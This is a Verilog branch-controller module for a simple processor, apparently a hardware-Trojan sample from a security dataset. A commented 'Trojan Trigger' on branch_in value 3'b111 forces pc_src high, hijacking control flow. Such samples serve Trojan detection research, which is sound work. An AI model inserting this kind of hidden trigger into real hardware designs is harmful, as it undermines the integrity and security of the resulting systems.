 module Branch_CTLR(
    input [2:0] branch_in,
    input zero_flag, sign_flag,
    output reg pc_src
);

wire BEQ, BNQ, BLT, BGT;

always@(branch_in, BEQ, BNQ, BLT, BGT) begin
    // Trojan Trigger: An unusual condition, not expected in normal operation
    if (branch_in == 3'b111) begin
        // Trojan Payload: Force an unexpected branch, altering control flow
        pc_src = 1'b1;
    end else begin
        // Original logic remains the same
        case (branch_in)
            3'b001: pc_src = BEQ; // branch equal
            3'b010: pc_src = BNQ; // branch not equal
            3'b011: pc_src = BLT; // branch less than
            3'b100: pc_src = BGT; // branch greater than (rs1 >= rs2)
            3'b101: pc_src = 1'b1; // jump-and-link-register instruction (JALR)
            3'b110: pc_src = 1'b1; // jump and link instruction (JAL)
            default: pc_src = 1'b0;
        endcase;
    end
end

assign BEQ = zero_flag ? 1'b1 : 1'b0;
assign BNQ = zero_flag ? 1'b0 : 1'b1;
assign BLT = sign_flag ? 1'b1 : 1'b0;
assign BGT = sign_flag ? 1'b0 : 1'b1;

endmodule
